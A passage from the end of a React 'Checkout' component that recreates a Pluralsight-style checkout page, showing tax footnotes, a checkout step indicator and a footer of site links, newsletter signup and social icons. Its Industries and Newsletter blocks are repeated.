              </div>

              {/* Tax Notice */}
              <div className="text-xs text-slate-400 space-y-2">
                <p>
                  <sup>†</sup> Pluralsight is required by law to collect transaction taxes such as sales tax, VAT, GST or other similar taxes on purchases in some jurisdictions. The actual tax amount will be calculated based on the applicable jurisdictional tax rates when your order is processed.
                </p>
                <p>
                  <sup>††</sup> Excluding transaction taxes such as sales tax, VAT, GST and other similar taxes
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Next Steps Preview */}
      <div className="border-t border-slate-700 px-6 py-6">
        <div className="max-w-7xl mx-auto">
          <div className="flex items-center gap-8">
            <div className="flex items-center gap-3">
              <div className="w-6 h-6 bg-slate-600 rounded-full flex items-center justify-center text-xs">
                2
              </div>
              <span className="text-slate-400">Payment</span>
            </div>
            <div className="flex items-center gap-8">
              <div className="flex items-center gap-3">
                <div className="w-6 h-6 bg-slate-600 rounded-full flex items-center justify-center text-xs">
                  3
                </div>
                <span className="text-slate-400">Review and confirm</span>
              </div>
              <div className="flex items-center gap-2 text-slate-400 text-sm">
                <Lock size={16} />
                <span>Secure checkout</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Comprehensive Footer */}
      <footer className="bg-slate-900 border-t border-slate-700">
        <div className="max-w-7xl mx-auto px-6 py-12">
          <div className="grid grid-cols-1 md:grid-cols-5 gap-8 mb-12">
            {/* Support */}
            <div>
              <h4 className="font-semibold mb-4">Support</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><a href="https://help.pluralsight.com/" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Contact</a></li>
                <li><a href="https://help.pluralsight.com/" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Help Center</a></li>
                <li><a href="https://help.pluralsight.com/help/ip-allowlist" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">IP Allowlist</a></li>
                <li><a href="https://www.pluralsight.com/sitemap" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Sitemap</a></li>
                <li><a href="https://www.pluralsight.com/mobile" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Download Pluralsight</a></li>
                <li><a href="https://www.pluralsight.com/individuals/pricing" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">View Plans</a></li>
                <li><a href="https://www.pluralsight.com/product/flow" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Flow Plans</a></li>
                <li><a href="https://www.pluralsight.com/professional-services" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Professional Services</a></li>
              </ul>
            </div>

            {/* Community */}
            <div>
              <h4 className="font-semibold mb-4">Community</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><a href="https://www.pluralsight.com/guides" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Guides</a></li>
                <li><a href="https://www.pluralsight.com/teach" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Teach</a></li>
                <li><a href="https://www.pluralsight.com/partners" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Partner with Pluralsight</a></li>
                <li><a href="https://www.pluralsight.com/one" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Pluralsight One</a></li>
                <li><a href="https://www.pluralsight.com/authors" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Authors</a></li>
              </ul>
            </div>

            {/* Company */}
            <div>
              <h4 className="font-semibold mb-4">Company</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><a href="https://www.pluralsight.com/about" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">About Us</a></li>
                <li><a href="https://www.pluralsight.com/careers" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Careers</a></li>
                <li><a href="https://www.pluralsight.com/newsroom" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Newsroom</a></li>
                <li><a href="https://www.pluralsight.com/resources" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Resources</a></li>
              </ul>
            </div>

            {/* Industries */}
            <div>
              <h4 className="font-semibold mb-4">Industries</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><a href="https://www.pluralsight.com/industries/education" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Education</a></li>
                <li><a href="https://www.pluralsight.com/industries/financial-services" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Financial Services (FSBI)</a></li>
                <li><a href="https://www.pluralsight.com/industries/healthcare" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Healthcare</a></li>
                <li><a href="https://www.pluralsight.com/industries/insurance" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Insurance</a></li>
                <li><a href="https://www.pluralsight.com/industries/non-profit" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Non-Profit</a></li>
                <li><a href="https://www.pluralsight.com/industries/public-sector" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Public Sector</a></li>
              </ul>
            </div>

            {/* Newsletter */}
            <div>
              <h4 className="font-semibold mb-4">Newsletter</h4>
              <p className="text-sm text-gray-400 mb-4">
                Sign up with your email to join our mailing list.
              </p>
              <div className="space-y-4">
                <Input type="email" placeholder="Email Address" className="bg-slate-800 border-slate-600 text-white placeholder:text-gray-400" />
                <div className="flex items-start gap-2">
                  <Checkbox className="mt-1" />
                  <label className="text-xs text-gray-400 leading-relaxed">
                    I would like to receive emails from Pluralsight
                  </label>
                </div>
                <Button className="w-full bg-red-500 hover:bg-red-600 text-white py-2 rounded-full">
                  Submit
                </Button>
              </div>

              {/* Social Icons */}
              <div className="flex gap-4 mt-6">
                <a href="https://twitter.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z" /></svg>
                </a>
                <a href="https://www.facebook.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M22.46 6c-.77.35-1.6.58-2.46.69.88-.53 1.56-1.37 1.88-2.38-.83.5-1.75.85-2.72 1.05C18.37 4.5 17.26 4 16 4c-2.35 0-4.27 1.92-4.27 4.29 0 .34.04.67.11.98C8.28 9.09 5.11 7.38 3 4.79c-.37.63-.58 1.37-.58 2.15 0 1.49.75 2.81 1.91 3.56-.71 0-1.37-.2-1.95-.5v.03c0 2.08 1.48 3.82 3.44 4.21a4.22 4.22 0 0 1-1.93.07 4.28 4.28 0 0 0 4 2.98 8.521 8.521 0 0 1-5.33 1.84c-.34 0-.68-.02-1.02-.06C3.44 20.29 5.7 21 8.12 21 16 21 20.33 14.46 20.33 8.79c0-.19 0-.37-.01-.56.84-.6 1.56-1.36 2.14-2.23z" /></svg>
                </a>
                <a href="https://www.instagram.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.174-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.219-.359-.219c0-1.781 1.062-3.188 2.384-3.188 1.125 0 1.669.844 1.669 1.853 0 1.128-.719 2.813-1.094 4.375-.312 1.313.656 2.384 1.953 2.384 2.344 0 4.031-3.021 4.031-6.594 0-2.724-1.812-4.781-4.969-4.781-3.72 0-6.062 2.75-6.062 5.797 0 1.047.401 1.789.934 2.384.219.25.25.469.188.719-.063.281-.203.844-.266 1.078-.078.375-.312.469-.719.281-1.297-.469-1.906-1.844-1.906-3.375 0-2.5 2.094-5.5 6.25-5.5 3.359 0 5.469 2.437 5.469 5.031 0 3.437-1.875 6.094-4.625 6.094-1.125 0-2.125-.656-2.469-1.406 0 0-.594 2.437-.719 2.937-.25.969-.875 1.844-1.281 2.469 1.062.328 2.188.516 3.375.516 6.624 0 11.99-5.367 11.99-11.988C24.007 5.367 18.641.001 12.017.001z" /></svg>
                </a>
                <a href="https://www.linkedin.com/company/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z" /></svg>
                </a>
                <a href="https://www.youtube.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" /></svg>
                </a>
              </div>
            </div>

            {/* Industries */}
            <div>
              <h4 className="font-semibold mb-4">Industries</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><a href="https://www.pluralsight.com/industries/education" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Education</a></li>
                <li><a href="https://www.pluralsight.com/industries/financial-services" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Financial Services (FSBI)</a></li>
                <li><a href="https://www.pluralsight.com/industries/healthcare" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Healthcare</a></li>
                <li><a href="https://www.pluralsight.com/industries/insurance" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Insurance</a></li>
                <li><a href="https://www.pluralsight.com/industries/non-profit" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Non-Profit</a></li>
                <li><a href="https://www.pluralsight.com/industries/public-sector" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Public Sector</a></li>
              </ul>
            </div>

            {/* Newsletter */}
            <div>
              <h4 className="font-semibold mb-4">Newsletter</h4>
              <p className="text-sm text-gray-400 mb-4">
                Sign up with your email to join our mailing list.
              </p>
              <div className="space-y-4">
                <Input type="email" placeholder="Email Address" className="bg-slate-800 border-slate-600 text-white placeholder:text-gray-400" />
                <div className="flex items-start gap-2">
                  <Checkbox className="mt-1" />
                  <label className="text-xs text-gray-400 leading-relaxed">
                    I would like to receive emails from Pluralsight
                  </label>
                </div>
                <Button className="w-full bg-red-500 hover:bg-red-600 text-white py-2 rounded-full">
                  Submit
                </Button>
              </div>

              {/* Social Icons */}
              <div className="flex gap-4 mt-6">
                <a href="https://twitter.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z" /></svg>
                </a>
                <a href="https://www.facebook.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M22.46 6c-.77.35-1.6.58-2.46.69.88-.53 1.56-1.37 1.88-2.38-.83.5-1.75.85-2.72 1.05C18.37 4.5 17.26 4 16 4c-2.35 0-4.27 1.92-4.27 4.29 0 .34.04.67.11.98C8.28 9.09 5.11 7.38 3 4.79c-.37.63-.58 1.37-.58 2.15 0 1.49.75 2.81 1.91 3.56-.71 0-1.37-.2-1.95-.5v.03c0 2.08 1.48 3.82 3.44 4.21a4.22 4.22 0 0 1-1.93.07 4.28 4.28 0 0 0 4 2.98 8.521 8.521 0 0 1-5.33 1.84c-.34 0-.68-.02-1.02-.06C3.44 20.29 5.7 21 8.12 21 16 21 20.33 14.46 20.33 8.79c0-.19 0-.37-.01-.56.84-.6 1.56-1.36 2.14-2.23z" /></svg>
                </a>
                <a href="https://www.instagram.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.174-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.219-.359-.219c0-1.781 1.062-3.188 2.384-3.188 1.125 0 1.669.844 1.669 1.853 0 1.128-.719 2.813-1.094 4.375-.312 1.313.656 2.384 1.953 2.384 2.344 0 4.031-3.021 4.031-6.594 0-2.724-1.812-4.781-4.969-4.781-3.72 0-6.062 2.75-6.062 5.797 0 1.047.401 1.789.934 2.384.219.25.25.469.188.719-.063.281-.203.844-.266 1.078-.078.375-.312.469-.719.281-1.297-.469-1.906-1.844-1.906-3.375 0-2.5 2.094-5.5 6.25-5.5 3.359 0 5.469 2.437 5.469 5.031 0 3.437-1.875 6.094-4.625 6.094-1.125 0-2.125-.656-2.469-1.406 0 0-.594 2.437-.719 2.937-.25.969-.875 1.844-1.281 2.469 1.062.328 2.188.516 3.375.516 6.624 0 11.99-5.367 11.99-11.988C24.007 5.367 18.641.001 12.017.001z" /></svg>
                </a>
                <a href="https://www.linkedin.com/company/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z" /></svg>
                </a>
                <a href="https://www.youtube.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" /></svg>
                </a>
              </div>
            </div>
          </div>

          {/* Bottom Footer */}
          <div className="border-t border-slate-700 pt-8 flex flex-col md:flex-row items-center justify-between">
            <div className="flex items-center gap-4 mb-4 md:mb-0">
              <div className="w-8 h-8 bg-orange-500 rounded flex items-center justify-center">
                <div className="w-0 h-0 border-l-[6px] border-l-transparent border-r-[6px] border-r-transparent border-b-[8px] border-b-white"></div>
              </div>
              <p className="text-sm text-gray-400">
                Copyright 2004 - 2025 Pluralsight LLC. All rights reserved
              </p>
            </div>
            <div className="flex gap-6 text-sm text-gray-400">
              <a href="https://legal.pluralsight.com/policies" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Terms of Service</a>
              <a href="https://legal.pluralsight.com/policies?name=privacy-notice" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Privacy Policy</a>
              <a href="https://www.pluralsight.com/contact" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Help Center</a>
              <a href="https://www.pluralsight.com/contact" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Contact Us</a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Checkout;
